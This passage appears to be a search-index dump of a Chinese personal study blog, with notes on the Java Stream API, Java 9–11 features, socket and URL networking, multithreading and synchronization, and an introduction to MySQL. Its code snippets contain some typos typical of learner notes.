int[]&#123;1,2,3,4,5&#125;;IntStream stream = Arrays.stream(arr);Employee[] arr1 = new Employee[]&#123;e1,e2&#125;;Stream&lt;Employee&gt; stream1 = Arrays.stream(arr1);\n\n方式三：通过Stream的of()\nStream&lt;Integer&gt; stream = Stream.of(1,2,3,4,5,6);\n\n中间操作\n筛选与切片\nList&lt;Employee&gt; employees = EmployeeData.getEmployees();Stream&lt;Employee&gt; stream = employees.stream();//过滤：查询员工表中薪资大于7000的员工信息stream.filter(e -&gt; e.getSalary() &gt; 7000).forEach(System.out::println);//截断：返回前n个元素employees.stream().limit(3).forEach(System.out::println);//跳过: 返回扔掉了前n个元素的流，如果流中元素不足n个，则返回空流employees.stream().skip(3).forEach(System.out::println);//筛选：通过流所生成元素的hashCode()和equals()去除重复元素employees.stream().distinct().forEach(System.out::println);\n\n映射\nList&lt;String&gt; list = Arrays.asList(&quot;aa&quot;,&quot;bb&quot;,&quot;cc&quot;,&quot;dd&quot;);list.stream().map(str -&gt; str.toUpperCase()).forEach(System.out::println);List&lt;Employee&gt; employees = EmployeeData.getEmployees();employees.stream().map(Employee :: getName).filter(name -&gt; name.length()&gt; 3).forEach(System.out::println);\n\n//flatMap(Function f):接受一个函数作为参数，将流中的每个值都换成另一个流，然后把所有流连接成一个流\n\n排序\nList&lt;Integer&gt; list= Arrays.asList(12,34,54,13,7,0,-93,3);list.stream().sorted().forEach(System.out::println);//sorted(Comparator com)List&lt;Employee&gt; employees = EmployeeData.getEmployees();employees.stream().sorted((e1,21)-&gt; Integer.compare(e1.getAge(),e2.getAge())).forEach(System.out::println);\n\n终止操作\n匹配与查找\n//allMatch(Predicate p)：检查是否匹配所有元素boolean allMatch = employees.stream().allMatch(e -&gt; e.getAge()&gt;18);//anyMatch(Predicate p):检查是否至少匹配一个元素boolean anyMatch = employees.stream().allMatch(e -&gt; e.getSalary()&gt;10000);//noneMatch(Predicate p):检查是否没有匹配的元素//findFirst:返回第一个元素Optional&lt;Employee&gt; employee = employees.stream().findFirst();//findAny:返回当前流中的任意元素//count:返回流中元素的总个数//max(Comparator c)：返回流中最大值Optional&lt;Double&gt; maxSalary = employees.stream().map(e -&gt; e.getSalary()).max(Double :: compare);//min(Comparator c)：返回流中最小值Optional&lt;Employee&gt; employee = employees.stream().mix((e1,e2)-&gt;Double.compare(e1.getSalary(),e2.getSalary()));//forEach(Consumer c)：内部迭代employees.stream().forEach(System.out::println);\n\n规约\n//reduce(T identity,BinaryOperator):可以将流中元素反复结合起来，得到一个值。返回T//计算1-10的自然数的和List&lt;Integer&gt; list= Arrays.asList(1,2,3,4,5,6,7,8,9,10);Integer sum = list.stream().reduce(0,Integer::sum);//reduce(BinaryOperator):可以将流中元素反复结合起来，得到一个值。返回Optional&lt;T&gt;//计算公司用所有员工工资的总和List&lt;Employee&gt; employees = EmployeeData.getEmployees();Optional&lt;Double&gt; sumMoney = employees.stream().map(e -&gt; e.getSalary()).reduce((d1,d2)-&gt;d1+d2);\n\n收集\n//collect(Collector c):将流转换为其他形式List&lt;Employee&gt; employeeList = employees.stream().filter(e -&gt; e.getSalary() &gt; 6000).collect(Collectors.toList());\n\nOptional类\nOptional&lt;T&gt;类是一个容器类，它可以保存类型T的值，代表这个值存在，或者仅仅保存null。可以避免空指针异常。\n\nJava9新特性模块化系统\n用模块来管理各个package，通过声明某个package暴露。模块（module）的概念，其实就是package外再裹一层。不声明默认就是隐藏。因此模块化使得代码组织上更安全。\n\n接口中可以声明私有方法try语句的改进String存储结构的变更由char[]改成byte[]加上编码标记，节约了一些空间\nInputStream中的transferTo()直接将输入流中的方法复制到输出流中\n增强的Stream API\ntakeWhile：返回从开头开始的按照制定规则尽量多的元素\ndropWhile：与takeWhile相反，返回剩余的元素\nofNullable：形参变量是可以为null值的单个元素\n\nOptional的新方法stream()Java10新特性局部变量类型推断//1.声明变量时，根据所附的值，推断变量的类型var num = 10;var list = new ArrayList&lt;Integer&gt;();//2.遍历操作for(var i:list)&#123;    &#125;for(var i = 0;i&lt;100;i++)&#123;    &#125;//局部变量不赋值不可以//var num//lambda表达式这种，左边的函数式接口不能声明为var//方法引用中，左边的函数式接口不能声明为var//数组的静态初始化中,如下情况不可以//var arr = &#123;1,2,3,4&#125;\n\n\nvar不是一个关键字\n不是Javascript\n\njava11新特性String中新增方法\nisBlank()\nstrip()\nstripTrailing()\nstripLeading()\nrepeat(int count)\nlines().count()\n\nOptional中新增方法局部变量类型推断的升级全新的HTTP客户端的API\n使用HTTP Client替换原有的HttpUrlConnection\n\n","categories":["Java基础"],"tags":["新特性"]},{"title":"Java基础（十）：网络编程","url":"/2023/02/06/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E5%8D%81%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/","content":"IP和端口号\n在Java中使用InetAddress类代表IP\n实例化InetAddress的两个方法：getByName(String host)、getLocalHost()\n两个常用方法：getHostName() 、getHostAddress()\n\n端口号\n端口号：标识正在计算机上运行的进程（程序）\n不同的进程有不同的端口号\n被规定为一个16位的整数：0~65535\n端口分类：\n公认端口：0~1023。被预先定义的服务通信占用（如：HTTP占用端口80，FTP占用端口21，Telnet占用端口23）\n注册端口：1024~49151。分配给用户进程或应用程序。（如：Tomcat占用端口8080，MySQL占用端口3306，Oracle占用端口1521等）\n动态&#x2F;私有端口：49152~65535。\n\n\n端口号与IP地址的组合得出一个网络套接字：Socket\n\nTCP和UDP网络通信协议\n传输层中两个非常重要的协议：\n\n传输控制协议TCP（Transmission Control Protocol）\n用户数据报协议UDP（User Datagram Protocol）\n\n\nTCP和UDP的不同点\n\nTCP：\n\n使用TCP协议之前，需先建立TCP连接，形成传输数据通道\n\n传输前，采用“三次握手”方式，点对点通信，是可靠的\n\n在连接中可进行大数据量的传输\n\n传输完毕，需释放已建立的连接（四次挥手），效率低\n\nTCP类似生活中的打电话\n\n\n\n\n\nUDP：\n\n将数据、源、目的封装成数据包，不需要建立连接\n每个数据包的大小限制在64K内\n发送不管对方是否准备好，接收方收到也不确定，故是不可靠的\n可以广播发送\n发送数据结束时无需释放资源，开销小，速度快\nTCP类似生活中的发送垃圾短信\n\n\n\n\n\nTCP网络编程\n例子1：客户端发送信息给服务端，服务端将数据显示在控制台上\n//客户端public void client()&#123;    Socket socket = null;    OutputStream os = null;    try&#123;        //1.创建Socket对象，指明服务器端的ip和端口号        InetAddress inet = InetAddress.getByName(&quot;127.0.0.1&quot;);//指明对方的ip        socket = new Socket(inet,8899);                //2.获取一个输出流，用于输出数据        os = socket.getOutputStream();                //3.写出数据的操作        os.write(&quot;你好，我是客户端mm&quot;.getBytes());    &#125;catch(IOException e)&#123;        e.printStackTrace();    &#125;finally&#123;        //4.资源的关闭        if(os!=null)&#123;            try&#123;                os.close();            &#125;catch(IOException e)&#123;                e.printStackTrace();            &#125;        &#125;        if(socket!=null)&#123;            try&#123;                socket.close();            &#125;catch(IOException e)&#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;//服务端public void server()&#123;    ServerSocket ss = null;    Socket socket = null;    InputStream is = null;    ByteArrayOutputStream baos = null;    try&#123;        //1.创建服务器端的ServerSocket,指明自己的端口号        ss = new ServerSocket(8899);        //2.调用accept()表示接收来种子于客户端的socket        socket = ss.accept;        //3.获取输入流        is = socket.getInputStream();        //4.读取输入流中的数据        baos = new ByteArrayOutputStream();        byte[] buffer = new byte[5];        int len;        while((len = is.read(buffer)) != -1)&#123;            baos.write(buffer,0,len);        &#125;        System.out.println(baos.toString());    &#125;catch(IOException e)&#123;        e.printStackTrace();    &#125;finally&#123;        //5.资源关闭        baos.close();        is.close();    \tsocket.close();        ss.close();    &#125;&#125;\n\nUDP网络编程//发送端public void sender()&#123;\tDatagramSocket socket = new DatagramSocket();        String str = &quot;我是UDP方式发送的导弹&quot;;    byte[] data = str.getBytes();    InetAddress inet = InetAddress.getLocalHost();    DatagramPacket packet = new DatagramPacket(data,data.length,inet,9090);        socket.send(packet);        socket.close();&#125;//接收端public void receiver()&#123;\tDatagramSocket socket = new DatagramSocket(9090);    byte[] buffer = new byte[100];    DatagramPacket packet = new DatagramPacket(buffer,0,buffer.length);    socket.receive(packet);        System.out.println(new String(packet.getData(),0,packet.getLength()));    socket.close();&#125;\n\nURL网络编程URL url = new URL(&quot;http://localhost:8080/examples/beauty.jpg&quot;);HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();urlConnection.connect();InputStream is = urlConnection.getInputStream();FileOutputStream fos = new FileOutputStram(&quot;beauty3.jpg&quot;);byte[] buffer = new byte[1024];int len;while((len = is.read(buffer)) != -1)&#123;    fos.write(buffer,0,len);&#125;is.close();fos.close();urlConnection.disconnect();      \n\n","categories":["Java基础"],"tags":["网络编程"]},{"title":"Java基础（四）：多线程","url":"/2023/01/20/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E5%A4%9A%E7%BA%BF%E7%A8%8B/","content":"程序、进程、线程\n程序（program）：是为了完成指定任务、用某种语言编写的一组指令的集合。即指一段静态的代码，静态对象。\n进程（process）：是程序的一次执行过程，或是正在运行的一个程序。是一个动态的过程：有它自身的产生、存在和消亡的过程。——生命周期\n进程作为资源分配的单位，系统在运行时会为每个进程分配不同的内存区域。\n\n\n线程（thread）：进程可进一步细化为线程，是一个程序内部的一条执行路径。\n若一个进程可以同一时间并行执行多个线程，就算支持多线程的。\n线程作为调度和执行的单位，每个线程拥有独立的运行栈和程序计数器（pc），线程切换的开销小。\n一个进程中的多个线程共享相同的内存单元&#x2F;内存地址空间–&gt;它们从同一堆中分配对象，可以访问相同的变量和对象。这就使得线程间通信更简便、高效。但多个线程操作共享的系统资源可能就会带来安全的隐患。—&gt;解决：线程的同步\n多个线程共享同一个堆和方法区，各自拥有独立的栈和程序计数器。\n\n\n\n单核CPU和多个CPU\n单核CPU：其实是一种假的多线程，因此在一个时间单元内，只能执行一个线程的任务。\n多核CPU：才能更好的发挥多线程的效率\n一个Java应用程序java.exe，至少有三个线程：main()主线程，gc()垃圾回收线程，异常处理线程。\n\n并行与并发\n并行：多个CPU同时执行多个任务。比如：多个人同时做不同的事。\n并发：一个CPU（采用时间片）”同时”执行多个任务。比如：秒杀、多个人做同一件事。\n\n多线程的优点\n背景：以单核CPU为例，只使用单个线程先后完成多个任务（调用多个方法），肯定比用多个线程来完成用的时间更短（因为不断切换线程需要耗时），为何仍需多线程？\n\n多线程的优点：\n\n对图形化界面更有意义，可增强用户体验\n提高CPU的利用率\n改善程序结构，将既长又复杂的进程分为多个线程，独立运行，利于理解和修改。\n\n何时需要多线程：\n\n程序需要同时执行两个或多个任务。\n程序需要实现一些需要等待的任务时，如用户输入、文件读写操作、网络操作、搜索等。\n需要一些后台运行的程序时\n\n创建多线程方式一：继承于Thread类package com.wushihan.java;/** * 多线程的创建，方式一：继承于Thread类 * @author wushihan * @create 2023-01-20 15:18 *///1. 创建一个继承于Thread的子类class MyThread extends Thread&#123;    //2. 重写Thread的run()    @Override    public void run() &#123;        for (int i = 0; i &lt; 100; i++) &#123;            if(i % 2 ==0)&#123;                System.out.println(i);            &#125;        &#125;    &#125;&#125;public class ThreadTest &#123;    public static void main(String[] args) &#123;        //3. 创建Thread的子类的对象        MyThread t1 = new MyThread();        //4. 通过此对象调用start()        t1.start();        //此时如果直接调用run()，则不是多线程        //t1.run();                //如下方法仍是在main线程中执行        for (int i = 0; i &lt; 100; i++) &#123;            if(i % 2 ==0)&#123;                System.out.println(i+&quot;*********main()***********&quot;);            &#125;        &#125;    &#125;&#125;\n\n\nstart()有两个作用：\n①先启动当前线程 ②然后调用当前线程的run()\n\n不能通过直接调用run()的方式启动线程\n\n不能让已经start()的线程再去执行，否则会报错\n\n若想创建多个线程，需要创建多个线程的对象\n\n\n创建匿名子类方法public class ThreadTest &#123;    public static void main(String[] args) &#123;        new Thread()&#123;            @Override            public void run() &#123;                for (int i = 0; i &lt; 100; i++) &#123;                    if(i % 2 ==0)&#123;                        System.out.println(i);                    &#125;                &#125;            &#125;        &#125;.start();    &#125;&#125;\n\n方式二：实现Runnable接口package com.wushihan.java;/** * @author wushihan * @create 2023-01-20 19:51 *///1. 创建一个实现Runnable接口的类class MThread implements Runnable&#123;    //2. 实现类去实现Runnable中的抽象方法：run()    @Override    public void run() &#123;        for (int i = 0; i &lt; 100; i++) &#123;            if(i % 2 ==0)&#123;                System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i);            &#125;        &#125;    &#125;&#125;public class ThreadTest1 &#123;    public static void main(String[] args) &#123;        //3. 创建实现类的对象        MThread mThread = new MThread();        //4. 将此对象作为参数传递到Thread类的构造器中，创建Thread对象        Thread t1 = new Thread(mThread);        t1.setName(&quot;线程一&quot;);        //5. 通过Thread的对象调用start():①启动线程 ②调用当前线程的run() ---&gt;调用了Runnable类型的run()        t1.start();                //再创建一个线程        Thread t2 = new Thread(mThread);        t2.setName(&quot;线程一&quot;);        t2.start();    &#125;&#125;\n\n两种方式的对比\n开发中优先选择：实现Runnable接口的方式\n原因：\n实现的方式没有类的单继承的局限性\n实现的方式更适合来处理多个线程有共享数据的情况\n\n\n两种方式的联系：\nThread类本身也实现了Runnable接口\n两种方式都需要重写run()，将线程要执行的逻辑放在run()中\n\n\n\n方式三：实现Callable接口（JDK5.0新增）package com.wushihan.java;import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask;/** * @author wushihan * @create 2023-01-21 12:02 *///1. 创建Callable的实现类class NumThread implements Callable&#123;    //2. 实现call方法，将此线程需要执行的操作声明在call()中    @Override    public Object call() throws Exception &#123;        int sum = 0;        for (int i = 1; i &lt;= 100; i++) &#123;            System.out.println(i);            sum += i;        &#125;        return sum;    &#125;&#125;public class ThreadNew &#123;    public static void main(String[] args) &#123;        //3. 创建Callable实现类的对象        NumThread numThread = new NumThread();        //4. 将Callable实现类的对象作为参数传递到FutureTask构造器中，创建FutureTask对象        FutureTask futureTask = new FutureTask(numThread);        //5. 将FutureTask对象作为参数传递到Thread构造器中，创建Thread对象，并开启线程        new Thread(futureTask).start();        try &#123;            //6. 获取Callable中call方法的返回值            Object sum = futureTask.get();            System.out.println(&quot;总和为：&quot;+sum);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125; catch (ExecutionException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n如何理解实现Callable接口的方式创建多线程比实现Runnable接口创建多线程方式强大？\ncall()可以有返回值\ncall()可以抛出异常，被外面的操作捕获，获取异常的信息\nCallable支持泛型\n\n\n\n方式四：使用线程池（JDK5.0新增）\n例子：微博下滑，主线程：不断将微博数据加载进列表；分线程×n：加载本条微博的图片、视频、文字等资源。(如果放在同一线程会特别卡)\n思路：提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。（类似公共交通工具）\n好处：\n提高响应速度（减少创建新线程的时间）\n降低资源消耗（重复利用线程池中的线程，不需要每次都创建）\n便于线程管理\ncorePoolSize：核心池的大小\nmaximumPoolSize：最大线程数\nkeepAliveTime：线程没有任务时最多保持多长时间后会终止\n\n\n\n\nJDK5.0 线程池相关API：ExecutorService 和 Executors\n\npackage com.wushihan.java;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;/** * @author wushihan * @create 2023-01-21 13:46 */class NumberThread1 implements Runnable &#123;    @Override    public void run() &#123;        for (int i = 1; i &lt;= 100; i++) &#123;            if(i%2 == 0) &#123;                System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i);            &#125;        &#125;    &#125;&#125;class NumberThread2 implements Runnable &#123;    @Override    public void run() &#123;        for (int i = 1; i &lt;= 100; i++) &#123;            if(i%2 != 0) &#123;                System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i);            &#125;        &#125;    &#125;&#125;public class ThreadPool &#123;    public static void main(String[] args) &#123;        //1. 提供指定线程数量的线程池        ExecutorService service = Executors.newFixedThreadPool(10);//        ThreadPoolExecutor service1 = (ThreadPoolExecutor)service;        //设置线程池的属性//        service1.setCorePoolSize(15);//        service1.setKeepAliveTime();        //2. 执行指定的线程操作        service.execute(new NumberThread1()); //适用于Runnable        service.execute(new NumberThread2());//        service.submit(); //适用于Callable        service.shutdown();    &#125;&#125;\n\n\n面试题：创建多线程有几种方式？四种。\n\n线程的常用方法\nstart()：起用当前线程，调用当前线程的run()\n\nrun()：通常需要重写Thread类中的此方法，将创建的线程要执行的操作声明在此方法中\n\ncurrentThread()：静态方法，返回执行当前代码的线程\n\ngetName()：获取当前线程的名字\n\nsetName()：设置当前线程的名字\nMyThread t1 = new MyThread();t1.setName(&quot;线程一&quot;)t1.start();\n\nyield()：释放当前CPU的执行权\nclass MyThread extends Thread&#123;    @Override    public void run() &#123;        for (int i = 0; i &lt; 100; i++) &#123;            if(i % 2 ==0)&#123;                System.out.println(i);            &#125;            if(i % 20 ==0)&#123;                yield();            &#125;        &#125;    &#125;&#125;\n\njoin()：在线程a中调用线程b的join()，此时线程a就进入阻塞状态，直到线程b完全执行完以后，线程a才结束阻塞状态。\npublic class ThreadTest &#123;    public static void main(String[] args) &#123;        MyThread t1 = new MyThread();        t1.start();;                for (int i = 0; i &lt; 100; i++) &#123;            if(i % 2 ==0)&#123;                System.out.println(i);            &#125;            if(i==20)&#123;                try&#123;                    h1.join();                &#125;catch(InterruptedException e)&#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;\n\nstop()：（已过时）强制结束当前线程\n\nsleep(long millitime)：让当前线程”睡眠”指定的millitime毫秒，在指定的时间内，当前线程时阻塞状态\nclass MyThread extends Thread&#123;    @Override    public void run() &#123;        for (int i = 0; i &lt; 100; i++) &#123;            if(i % 2 ==0)&#123;                try&#123;                    sleep(1000);                &#125;catch(InterruptedException e)&#123;                    e.printStackTrace();                &#125;                                System.out.println(i);            &#125;            if(i % 20 ==0)&#123;                yield();            &#125;        &#125;    &#125;&#125;\n\nisAlive：判断当前线程是否存活\n\ngetPriority()：返回线程优先值\n\nMAX_PRIORITY:10\nMIN_PRIORITY:1\nNORM_PRIORITY:5 默认优先级\n\n\nsetPriority(int newPriority)：改变线程的优先级\n说明：高优先级的线程要抢占低优先级线程cpu的执行权，但是只是从概率上讲，高优先级的线程高概率的情况下被执行，并不意味着只有当高优先级的线程执行完以后，低优先级的线程才执行。\n\n\n线程的生命周期\n五种状态\n新建\n就绪\n运行\n阻塞\n死亡\n\n\n\n\n线程的同步（线程的安全问题）\n例子：创建三个窗口卖票，总票数为100张，使用实现Runnable接口的方法\n问题：卖票过程中，出现了重票、错票 —&gt; 出现了线程的安全问题\n问题出现的原因：当某个线程操作车票的过程中，尚未操作完成时，其它线程参与进来，也操作车票\n如何解决：当一个线程a在操作ticket（共享数据）的时候，其它线程不能参与进来。知道线程a操作完ticket时，其它线程才可以操作ticket。这种情况即使线程a出现了阻塞，也不能改变。\n\n\nJava中通过同步机制，解决线程的安全问题。\n方式一：同步代码块\n方式二：同步方法\n\n方式一：同步代码块关键字：synchronized\nsynchronized（同步监视器）{\n​     &#x2F;&#x2F;需要被同步的代码\n}\n说明：\n\n操作共享数据的代码，即为需要被同步的代码。\n—&gt;不能包含代码多了，也不能包含少了\n\n共享数据：多个线程共同操作的变量，如ticket\n\n同步监视器，俗称：锁。任何一个类的对象，都可以充当锁。\n要求：多个线程必须要共用同一把锁\n\n在实现Runnable接口传教多线程的方式中，可以考虑使用this充当同步监视器\n\n在继承Thread类创建多线程的方法中，慎用this充当同步监视器，考虑使用当前类充当同步监视器\n\n\n\n操作同步代码时，只能由一个线程参与，其它线程等待。相当于时一个单线程的过程，效率低。\n\n\n处理实现Runnable的线程安全问题package com.wushihan.java;/** * @author wushihan * @create 2023-01-20 21:04 */class Window implements Runnable&#123;    private int ticket = 100;    Object obj = new Object();//对象声明在这里，就以为着只有一把锁        @Override    public void run() &#123;        //Object obj = new Object();        //如果声明在这里，就不是一把锁        while (true)&#123;            synchronized (obj) &#123;  //可以把obj换成this                if (ticket &gt; 0) &#123;                    try &#123;                        Thread.sleep(100);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                    System.out.println(Thread.currentThread().getName() + &quot;卖票：票号为：&quot; + ticket);                    ticket--;                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;&#125;public class WindowTest &#123;    public static void main(String[] args) &#123;        Window window = new Window();        Thread t1 = new Thread(window);        Thread t2 = new Thread(window);        Thread t3 = new Thread(window);        t1.setName(&quot;窗口一&quot;);        t2.setName(&quot;窗口二&quot;);        t3.setName(&quot;窗口三&quot;);        t1.start();        t2.start();        t3.start();    &#125;&#125;\n\n处理继承Thread类的线程安全问题package com.wushihan.java;/** * @author wushihan * @create 2023-01-20 21:25 */class Window2 extends Thread&#123;    private static int ticket = 100;    private static Object obj = new Object();        @Override    public void run() &#123;        while (true)&#123;            synchronized (obj) &#123;  //可以把obj换成Window2.class                if (ticket &gt; 0) &#123;                    try &#123;                        Thread.sleep(100);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                    System.out.println(Thread.currentThread().getName() + &quot;卖票：票号为：&quot; + ticket);                    ticket--;                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;&#125;public class WindowTest2 &#123;    public static void main(String[] args) &#123;        Window2 w1 = new Window2();        Window2 w2 = new Window2();        Window2 w3 = new Window2();        w1.setName(&quot;窗口一&quot;);        w2.setName(&quot;窗口二&quot;);        w3.setName(&quot;窗口三&quot;);        w1.start();        w2.start();        w3.start();    &#125;&#125;\n\n方式二：同步方法\n如果操作共享数据的代码完整的声明在一个方法中，不妨将此方法声明为同步的。\n\n同步方法仍然涉及到同步监视器，只是不需要显式声明\n\n非静态的同步方法，同步监视器时：this\n静态的同步方法，同步监视器：当前类本身\n\n\n处理实现Runnable的线程安全问题package com.wushihan.java;/** * @author wushihan * @create 2023-01-20 21:04 */class Window3 implements Runnable&#123;    private int ticket = 100;    @Override    public void run() &#123;        while (true)&#123;            show();        &#125;    &#125;    private synchronized void show()&#123;  //同步监视器：this        if (ticket &gt; 0) &#123;            try &#123;                Thread.sleep(100);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;            System.out.println(Thread.currentThread().getName() + &quot;卖票：票号为：&quot; + ticket);            ticket--;        &#125;    &#125;&#125;public class WindowTest3 &#123;    public static void main(String[] args) &#123;        Window window3 = new Window();        Thread t1 = new Thread(window3);        Thread t2 = new Thread(window3);        Thread t3 = new Thread(window3);        t1.setName(&quot;窗口一&quot;);        t2.setName(&quot;窗口二&quot;);        t3.setName(&quot;窗口三&quot;);        t1.start();        t2.start();        t3.start();    &#125;&#125;\n\n处理继承Thread类的线程安全问题package com.wushihan.java;/** * @author wushihan * @create 2023-01-20 21:25 */class Window4 extends Thread&#123;    private static int ticket = 100;    private static Object obj = new Object();    @Override    public void run() &#123;        while (true)&#123;            show();        &#125;    &#125;    private static synchronized void show()&#123; //同步监视器：Window4.class        if (ticket &gt; 0) &#123;            try &#123;                Thread.sleep(100);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;            System.out.println(Thread.currentThread().getName() + &quot;卖票：票号为：&quot; + ticket);            ticket--;        &#125;    &#125;&#125;public class WindowTest4 &#123;    public static void main(String[] args) &#123;        Window4 w1 = new Window4();        Window4 w2 = new Window4();        Window4 w3 = new Window4();        w1.setName(&quot;窗口一&quot;);        w2.setName(&quot;窗口二&quot;);        w3.setName(&quot;窗口三&quot;);        w1.start();        w2.start();        w3.start();    &#125;&#125;\n\n线程安全的单例模式（懒汉式）方法一：效率稍差class Bank&#123;    private Bank()&#123;&#125;        private static Bank instance = null;        public static sysnchronized Bank getInstance()&#123;        if(instanc == null)&#123;            instance = new Bank();        &#125;        return instance;    &#125;&#125;\n\nclass Bank&#123;    private Bank()&#123;&#125;        private static Bank instance = null;        public static  Bank getInstance()&#123;        sysnchronized(Bank.class)&#123;            if(instanc == null)&#123;                instance = new Bank();            &#125;            return instance;        &#125;    &#125;&#125;\n\n方法二：效率较高class Bank&#123;    private Bank()&#123;&#125;        private static Bank instance = null;        public static  Bank getInstance()&#123;        if(instance == null)&#123;            sysnchronized(Bank.class)&#123;                if(instance == null)&#123;                    instance = new Bank();                &#125;            &#125;        &#125;        return instance;    &#125;&#125;\n\n\n线程的死锁问题\n死锁：\n\n不同的线程分别占用对方需要的同步资源不放弃，都在等待对方放弃自己需要的同步资源，就形成了线程的死锁。\n出现死锁后，不会出现异常，不会出现提示，只是所有的线程都处于阻塞状态，无法继续。\n\n\n解决线程安全问题的方式三：Lock锁package com.wushihan.java;import java.util.concurrent.locks.ReentrantLock;/** * @author wushihan * @create 2023-01-20 21:04 */class WindowLock implements Runnable&#123;    private int ticket = 100;    //1. 实例化ReentrantLock    private ReentrantLock lock = new ReentrantLock();    @Override    public void run() &#123;        while (true)&#123;            try &#123;                //2. 调用锁定方法：lock()                lock.lock();                if (ticket &gt; 0) &#123;                    try &#123;                        Thread.sleep(100);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                    System.out.println(Thread.currentThread().getName() + &quot;卖票：票号为：&quot; + ticket);                    ticket--;                &#125;else &#123;                    break;                &#125;            &#125;finally &#123;                //3. 调用解锁方法：unclock()                lock.unlock();            &#125;        &#125;    &#125;&#125;public class WindowTest5 &#123;    public static void main(String[] args) &#123;        WindowLock windowLock = new WindowLock();        Thread t1 = new Thread(windowLock);        Thread t2 = new Thread(windowLock);        Thread t3 = new Thread(windowLock);        t1.setName(&quot;窗口一&quot;);        t2.setName(&quot;窗口二&quot;);        t3.setName(&quot;窗口三&quot;);        t1.start();        t2.start();        t3.start();    &#125;&#125;\n\n\n面试题：synchronized与Lock的异同？\n\n相同：二者都可以解决线程安全问题\n\n不同：\n\n隐式锁：synchronized机制在执行完相应的同步代码后，自动给的释放同步监视器\n显式锁：Lock需要手动的启动同步（Lock()），同时结束同步也需要手动的实现（unlock()）\n\nLock只有代码块锁，synchronized有代码块锁和方法锁\n\n使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性（提供更多的子类）\n\n\n\n\n\n优先使用顺序\n\nLock –&gt; 同步代码块（已经进入了方法体，分配的相应资源）–&gt; 同步方法（在方法体之外）\n\n\n面试题：如何解决线程安全问题？有几种方式？\n\n\n线程的通信\n涉及到的三个方法\nwait()：一旦执行此方法，当前线程就进入阻塞状态，并释放同步监视器\nnotify()：一旦执行此方法，就会唤醒被wait的一个线程。如果有多个线程被wait，就唤醒优先级高的\nnotifyAll()：一旦执行此方法，就会唤醒所有被wait的线程\n\n\n说明：\nwait()、notify()、notifyAll()三个方法必须使用在同步代码块或同步方法中。\nwait()、notify()、notifyAll()三个方法调用者必须是同步代码块或同步方法中的同步监视器。否则会出现IllegalMonitorStateException异常。\nwait()、notify()、notifyAll()三个方法定义在java.lang.Object类中\n\n\n\n线程一、二交替进行\npackage com.wushihan.java;/** * @author wushihan * @create 2023-01-20 21:04 */class Window implements Runnable&#123;    private int ticket = 100;        @Override    public void run() &#123;        while (true)&#123;            synchronized (this) &#123;                                notify();                                if (ticket &gt; 0) &#123;                    try &#123;                        Thread.sleep(100);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                    System.out.println(Thread.currentThread().getName() + &quot;卖票：票号为：&quot; + ticket);                    ticket--;                                        try &#123;                        //使得调用如下wait()方法的线程进入阻塞状态                        wait();                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;&#125;public class WindowTest &#123;    public static void main(String[] args) &#123;        Window window = new Window();        Thread t1 = new Thread(window);        Thread t2 = new Thread(window);        t1.setName(&quot;窗口一&quot;);        t2.setName(&quot;窗口二&quot;);        t1.start();        t2.start();    &#125;&#125;\n\n\n面试题：sleep()和wait()的异同？\n相同点：一旦执行方法，都可以使得当前线程进入阻塞状态\n不同点：\n声明位置不同：Thread类中声明sleep()，Object类中声明wait()\n调用要求不同：sleep()可以在任何需要的场景下调用，wait()必须使用在同步代码块或同步方法中\n关于是否释放同步监视器：如果两个方法都使用在同步代码块或同步方法中，sleep()不会释放锁，wait()会释放锁。\n\n\n\n\n\n","categories":["Java基础"],"tags":["多线程"]},{"title":"MySQL（一）：数据库概述","url":"/2023/02/08/MySQL%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0/","content":"关系型数据库与非关系型数据库\n关系型数据库（RDBMS）\nOracle\nMySQL\n……\n\n\n非关系型数据库（NoSQL）\n键值型数据库：redis\n文档型数据库：MongoDB\n搜索引擎数据库：Solr、Elasticsearch、Splunk等\n列式数据库：HBase\n图形数据库\n\n\n\n关系型数据库涉及原则表、记录、字段\nORM思想（Object Relational Mapping）\n数据库中的一个表   &lt;——-&gt;  Java或Python中的一个对象\n表中的一条数据(记录)  &lt;——-&gt;  类中的一个对象（或实体）\n表中的一个列  &lt;——-&gt; 类中的一个字段、属性（field)\n\n\n\n表的关联关系\n一对一关联\n一对多关联\n多对多关联\n自我引用\n\n","categories":["MySQL"],"tags":["数据库简介"]},{"title":"MySQL（七）：约束","url":"/2023/02/09/MySQL%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E7%BA%A6%E6%9D%9F/","content":"数据完整性与约束的分类\n为什么需要约束？\n为了保证数据的完整性\n\n\n\n\n约束：对表中字段的限制\n\n约束的分类：\n\n角度一：约束字段的个数\n单列约束 vs 